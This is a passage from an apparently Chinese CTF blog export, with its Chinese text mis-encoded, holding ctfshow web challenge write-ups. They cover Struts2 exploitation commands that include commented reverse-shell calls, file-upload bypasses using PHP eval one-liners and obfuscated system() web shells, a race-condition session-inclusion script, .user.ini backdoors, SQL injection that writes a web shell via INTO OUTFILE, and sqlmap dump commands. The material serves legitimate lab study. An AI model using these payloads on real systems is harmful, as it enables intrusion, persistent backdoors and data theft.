-la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"># s = S2_046(&quot;http://192.168.100.8/doUpload.action&quot;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"># print(s.upload_shell(&#x27;/usr/local/tomcat/webapps/ROOT/shell.jsp&#x27;, &#x27;shell.jsp&#x27;))</span><br><span class="line"> </span><br><span class="line"># s = S2_052(&#x27;http://192.168.100.8/orders/3/edit&#x27;)</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_048(&quot;http://192.168.100.8/integration/saveGangster.action&quot;, data=&#x27;name=&#123;exp&#125;&amp;age=123&amp;__checkbox_bustedBefore=true&amp;description=123&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_053(&quot;http://192.168.100.8&quot;, data=&#x27;name=&#123;exp&#125;&#x27;)</span><br><span class="line"># s.check()</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_devMode(&quot;http://192.168.100.8/orders&quot;)</span><br><span class="line"># print(s.get_path())</span><br><span class="line"># print(s.exec_cmd(&#x27;ls -la&#x27;))</span><br><span class="line"># s.reverse_shell(&#x27;192.168.100.8&#x27;, &#x27;8888&#x27;)</span><br><span class="line"> </span><br><span class="line"># s = S2_057(&quot;http://192.168.100.8:8080/showcase/actionChain1.action&quot;)</span><br><span class="line"># print(s.check())</span><br><span class="line"># print(s.exec_cmd(&quot;cat /etc/passwd&quot;))</span><br><span class="line"># s.reverse_shell(&quot;192.168.100.8&quot;, 9999)</span><br></pre></td></tr></table></figure>



<p>è¯•ä¸€è¯•ï¼Œæ€»æœ‰ä¸€ä¸ªå·¥å…·èƒ½æ‰«å‡ºæ¥ã€‚</p>
<h2 id="web281"><a href="#web281" class="headerlink" title="web281"></a>web281</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/Struts2Scan-main2/Struts2Scan.py -u http://e17352eb-573e-46ab-883c-f4f9c9e0b05a.challenge.ctf.show/S2-007/user.action -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<p>env</p>
<h2 id="web282"><a href="#web282" class="headerlink" title="web282"></a>web282</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/Struts2Scan-main2/Struts2Scan.py -u http://bacf75dd-e6b8-408f-8dbf-96393355c935.challenge.ctf.show/S2-008/ -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œenvå‘½ä»¤å³å¯</p>
<h2 id="web283"><a href="#web283" class="headerlink" title="web283"></a>web283</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/scanjava -u http://f89ab82b-bf00-4be0-9fff-b4927359e0b0.challenge.ctf.show/S2-009/showcase.jsp  -n S2-008 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web284"><a href="#web284" class="headerlink" title="web284"></a>web284</h2><p>æ²¡æ‰«æå‡ºæ¥</p>
<h2 id="web285"><a href="#web285" class="headerlink" title="web285"></a>web285</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python /home/zhou/æ¡Œé¢/Struts2Scan-main2/Struts2Scan.py -u http://31827834-612a-41c2-9f06-9d1c6922cc8d.challenge.ctf.show/S2-013/ -n S2-016 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web286"><a href="#web286" class="headerlink" title="web286"></a>web286</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://54a3836e-b43d-4729-9bda-c0c23a1120c1.challenge.ctf.show/S2-015/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web287"><a href="#web287" class="headerlink" title="web287"></a>web287</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://853f6c12-23a7-41ec-b348-b13be3564049.challenge.ctf.show/S2-016/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web288"><a href="#web288" class="headerlink" title="web288"></a>web288</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://d9f873ad-c396-4e2b-b7d4-67cc2985cdfc.challenge.ctf.show/S2-019/example/HelloWorld.action -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web289"><a href="#web289" class="headerlink" title="web289"></a>web289</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://d6d16853-7bbc-4a03-8ade-233139abddc1.challenge.ctf.show/S2-029/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web290"><a href="#web290" class="headerlink" title="web290"></a>web290</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 /home/zhou/æ¡Œé¢/scanjava -u http://fe185d70-2910-4b03-b06d-fe4fe6f17e45.challenge.ctf.show/S2-032/ -n S2-045 --exec</span><br></pre></td></tr></table></figure>

<h2 id="web291"><a href="#web291" class="headerlink" title="web291"></a>web291</h2>]]></content>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowæ–‡ä»¶ä¸Šä¼ </title>
    <url>/2023/02/15/ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>  æ–‡ä»¶ä¸Šä¼ </p>
 <span id="more"></span>

<p>ç»•è¿‡&lt;?  ç”¨</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åç¼€æ”¹ä¸º phtml</p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262">(9æ¡æ¶ˆæ¯) CTFSHOWæ–‡ä»¶ä¸Šä¼ ç¯‡_ctfshow web162_yu22xçš„åšå®¢-CSDNåšå®¢</a></p>
<p>phpæ®µæ ‡ç­¾ç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=(è¡¨è¾¾å¼)?&gt;  ç­‰ä»·äº &lt;?php echo (è¡¨è¾¾å¼)?&gt;</span><br><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>è¿‡æ»¤äº†[],ç”¨èŠ±æ‹¬å·ä»£æ›¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST&#123;1&#125;)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web162163"><a href="#web162163" class="headerlink" title="web162163"></a>web162163</h2><p>sessionæ–‡ä»¶åŒ…å«</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">session=requests.session()</span><br><span class="line">sess=&#x27;yu22x&#x27;</span><br><span class="line">url1=&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/&quot;</span><br><span class="line">url2=&quot;http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload&quot;</span><br><span class="line">data1=&#123;</span><br><span class="line">	&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;:&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">file=&#123;</span><br><span class="line">	&#x27;file&#x27;:&#x27;yu22x&#x27;</span><br><span class="line">&#125;</span><br><span class="line">cookies=&#123;</span><br><span class="line">	&#x27;PHPSESSID&#x27;: sess</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">def write():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.post(url1,data=data1,files=file,cookies=cookies)</span><br><span class="line">def read():</span><br><span class="line">	while True:</span><br><span class="line">		r = session.get(url2)</span><br><span class="line">		if &#x27;flag&#x27; in r.text:</span><br><span class="line">			print(r.text)</span><br><span class="line">			</span><br><span class="line">threads = [threading.Thread(target=write),</span><br><span class="line">       threading.Thread(target=read)]</span><br><span class="line">for t in threads:</span><br><span class="line">	t.start()</span><br></pre></td></tr></table></figure>



<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>pngå›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ç»•è¿‡</p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>ä¼ ä¸€ä¸ªä¸€å¥è¯å‹ç¼©åŒ…å³å¯</p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p><strong>.user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</strong></p>
<p>php.ini æ˜¯ php çš„ä¸€ä¸ªå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå¯¹æ•´ä¸ª web æœåŠ¡èµ·ä½œç”¨ï¼›</p>
<p>.user.ini ä½¿ç”¨èŒƒå›´å¾ˆå¹¿ï¼Œä¸ä»…é™äº Apache æœåŠ¡å™¨ï¼ŒåŒæ ·é€‚ç”¨äº Nginx æœåŠ¡å™¨</p>
<p>ä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•</p>
<p><code>auto_prepend_file = 1.jpg</code> è¿™ä¸ªé…ç½®çš„æ„æ€å°±æ˜¯åœ¨å½“å‰ç›®å½•ä¸‹çš„.php æ–‡ä»¶åŒ…å« 1.jpg è¿™ä¸ªå›¾ç‰‡ï¼Œåœ¨æ­¤å¤„ç›¸å½“äºåœ¨ 11.php æ–‡ä»¶å¤´æ’å…¥äº† <code>require(&#39;1.jpg&#39;)</code> è¿™æ¡è¯­å¥ï¼Œä¹Ÿå°±æ˜¯è¯´ç›¸å½“äºæ–‡ä»¶åŒ…å«ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auto_prepend_file = &lt;filename&gt;         //åŒ…å«åœ¨æ–‡ä»¶å¤´</span><br><span class="line">auto_append_file = &lt;filename&gt;          //åŒ…å«åœ¨æ–‡ä»¶å°¾</span><br></pre></td></tr></table></figure>

<p><strong>.htaccess é…ç½®æ–‡ä»¶</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>å°†æ‰€æœ‰æ–‡ä»¶éƒ½è§£æä¸º php æ–‡ä»¶,åªå¯¹è¯¥æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹çš„æ–‡ä»¶èµ·ä½œç”¨ã€‚åªåœ¨ Apache æœåŠ¡å™¨ä¸­èµ·ä½œç”¨ã€‚</p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>å…æ€</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;s#y#s#t#e#m&quot;;</span><br><span class="line">$b = explode(&quot;#&quot;,$a);</span><br><span class="line">$c = $b[0].$b[1].$b[2].$b[3].$b[4].$b[5];</span><br><span class="line">$c($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=substr(&#x27;1s&#x27;,1).&#x27;ystem&#x27;;</span><br><span class="line">$a($_REQUEST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=$_REQUEST[&#x27;a&#x27;];</span><br><span class="line">$b=$_REQUEST[&#x27;b&#x27;];</span><br><span class="line">$a($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>å…³é”®è¯ <code>layui</code> upload</p>
<p>å‰ç«¯éªŒè¯å¿…é¡»æ˜¯zip</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;button type=<span class="string">&quot;button&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">layui</span>-<span class="title">btn</span>&quot; <span class="title">id</span>=&quot;<span class="title">upload</span>&quot; <span class="title">lay</span>-<span class="title">data</span>=&quot;</span>&#123;url: <span class="string">&#x27;upload.php&#x27;</span>, accept: <span class="string">&#x27;images&#x27;</span>,exts:<span class="string">&#x27;zip&#x27;</span>&#125;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">			  &lt;i class=&quot;</span>layui-icon<span class="string">&quot;&gt;&amp;#xe67c;&lt;/i&gt;ä¸Šä¼ æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡å°è¯•&lt;&gt;è¢«æ€äº†</p>
<p>åç«¯éªŒè¯å¿…é¡»æ˜¯pngæ–‡ä»¶</p>
<p>-Disposition: form-data; name&#x3D;â€fileâ€; filename&#x3D;â€.user.zipâ€<br>Content-Type: application&#x2F;x-zip-compressed</p>
<p>åˆ›å»ºä¸€ä¸ªå‹ç¼©åŒ….user.zip è®°äº‹æœ¬æ‰“å¼€</p>
<p><code>auto_append_file</code> string</p>
<p>æŒ‡å®šåœ¨ä¸»æ–‡ä»¶ä¹‹åè‡ªåŠ¨è§£æçš„æ–‡ä»¶åã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89A</span><br><span class="line">auto_append_file=&quot;/var/log/nginx/access.log&quot;</span><br></pre></td></tr></table></figure>

<p>å³ä¿®æ”¹ä¸º .user.ini</p>
<p>ç±»å‹ä¿®æ”¹ä¸ºimage&#x2F;png</p>
<p>åŒæ—¶user-agentä¼ å…¥ä¸€å¥è¯æœ¨é©¬</p>
<p>å³å¯ä¸Šä¼ </p>
<p>åŒç†åŒæ—¶ï¼Œå†ä¸Šä¼ ä¸€ä¸ª1.phpï¼Œå†…å®¹éšä¾¿</p>
<p>ä¸€å‰‘è¿æ¥upload&#x2F;1.php</p>
<p>åœ¨æ ¹ç›®å½•ä¸‹&#x2F;var&#x2F;www&#x2F;html&#x2F;ä¸‹</p>
<p>auto_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­</p>
<p><a href="https://blog.csdn.net/weixin_53146913/article/details/124840296?ops_request_misc=%7B%22request_id%22:%22167645042416782429787891%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167645042416782429787891&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-124840296-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev1%5Econtrol&utm_term=user.ini&spm=1018.2226.3001.4187">(13æ¡æ¶ˆæ¯) ã€æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‘user.iniç•™åé—¨_èœèœzhaoçš„åšå®¢-CSDNåšå®¢_.user.ini</a></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>æ–‡ä»¶ä¸Šä¼ </tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowä»£ç å®¡è®¡</title>
    <url>/2023/03/16/ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>ä»£ç å®¡è®¡</p>
  <span id="more"></span>


<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment">//åœ¨ PHP ä¸­ï¼Œæœ‰ä¸¤ç§å¸¸ç”¨æ¥å£ç”¨äºè¿æ¥ MySQL æ•°æ®åº“å¹¶ä¸ä¹‹äº¤äº’ï¼š`mysqli`å’Œ`PDO`.</span></span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æºç ä¸‹è½½åœ°å€<a href="https://ctfshow.lanzoui.com/ilMPgjfeyxa">https://ctfshow.lanzoui.com/ilMPgjfeyxa</a></p>
<p>ä½¿ç”¨<code>mysqli</code>ï¼Œæ‚¨å¯ä»¥æ‰§è¡Œæ‰€æœ‰å¸¸è§çš„æ•°æ®åº“æ“ä½œï¼Œä¾‹å¦‚æŸ¥è¯¢ã€æ’å…¥ã€æ›´æ–°å’Œåˆ é™¤æ•°æ®ã€‚</p>
<p>è§£æ³•ä¸€payloadï¼š</p>
<p>1â€™ union select 1# â€˜;</p>
<p>1ï¼›åŸç†å¦‚ä¸‹</p>
<p><a href="https://blog.csdn.net/q20010619/article/details/120592532">(10æ¡æ¶ˆæ¯) CTFshowåˆ·é¢˜æ—¥è®°-WEB-ä»£ç å®¡è®¡(web301-310)SQLæ³¨å…¥ã€SSRFæ‰“MySQLã€SSRFæ‰“FastCGIã€SSRFæ–‡ä»¶è¯»å–_ctfshow web303_OceanSecçš„åšå®¢-CSDNåšå®¢</a></p>
<p>è§£æ³•äºŒsqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --dump --forms --batch</span><br></pre></td></tr></table></figure>

<p>  checklogin.php æºç å¦‚ä¸‹ï¼Œèƒ½è·‘ä½†åªèƒ½è·‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username=$_POST[&#x27;userid&#x27;];</span><br><span class="line">$userpwd=$_POST[&#x27;userpwd&#x27;];</span><br><span class="line">$sql=&quot;select sds_password from sds_user where sds_username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>forms é€‰æ‹©post ä¼ å‚ï¼Œbatché€‰æ‹©è‡ªåŠ¨yes</p>
<p>ç”±äºä¸Šé¢è·‘çš„å¤ªæ…¢ä¹Ÿå¯ä»¥é€‰æ‹©sql 6è¿</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --current-db</span><br><span class="line">//è·‘å‡ºæ•°æ®åº“sds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --tables -D &quot;sds&quot;</span><br><span class="line">//è·‘å‡ºè¡¨ sds_user</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --columns  -T &quot;sds_user&quot; -D &quot;sds&quot;   </span><br></pre></td></tr></table></figure>

<p> è·‘å‡ºå­—æ®µ</p>
<p>sds_password<br> sds_username </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://f922feab-0cee-4250-bf07-c4fe567b6974.challenge.ctf.show/checklogin.php --forms --batch --dump  -T &quot;sds_user&quot; -D &quot;sds&quot; -C &quot;sds_password&quot; </span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºå¯†ç ï¼šctfshowwwww    ç™»é™†å³å¯</p>
<p>è§£æ³•ä¸‰</p>
<p>username</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;#</span><br></pre></td></tr></table></figure>

<p>passwd&#x3D;1</p>
<p>è®¿é—®url&#x2F;1.php </p>
<p>èšå‰‘è¿æ¥</p>
<p><a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376?ops_request_misc=%7B%22request_id%22:%22167894875516800225569050%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167894875516800225569050&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-73437376-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=$_SESSION&spm=1018.2226.3001.4187">(10æ¡æ¶ˆæ¯) phpä¹‹$_SESSIONçš„ç†è§£_php $_session_å‹ç¼˜èšå‹çš„åšå®¢-CSDNåšå®¢</a></p>
<p>ctfshow{7623027b-8b89-4757-8f8f-5f10d6a87c1b}</p>
<h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!strcasecmp(sds_decode($userpwd),$row[&#x27;sds_password&#x27;]))&#123;</span><br></pre></td></tr></table></figure>

<p>ä¸‹è½½åæºç åwpä¸ç¬¦ï¼ŒæŒ‰wpçš„æ¥</p>
<p>ç™»å½•æ—¶åˆ¤æ–­äº†è¢« sds_decode() å¤„ç†åçš„å¯†ç æ˜¯å¦å’ŒæŸ¥è¯¢å‡ºæ¥çš„å¯†ç ä¸€è‡´</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸Šé¢˜è§£æ³•ä¸€ç”¨ä¸äº†äº†</p>
<p>å¯ä»¥</p>
<p>ä¸Šé¢˜payloadå†™shellä¾æ—§èƒ½ç”¨</p>
<p>ctfshow{b85b90e6-b5cc-46c1-93e2-1c421de498a0}</p>
<h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>åœ¨sqlæŸ¥è¯¢ä¹‹å‰åŠ å…¥äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">6</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†è¯•äº†è¯•ï¼Œadmin,adminå³å¯è¿›å…¥ã€‚</p>
<p>å®¡è®¡æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//æ³¨å…¥ç‚¹</span></span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>])?<span class="variable">$_POST</span>[<span 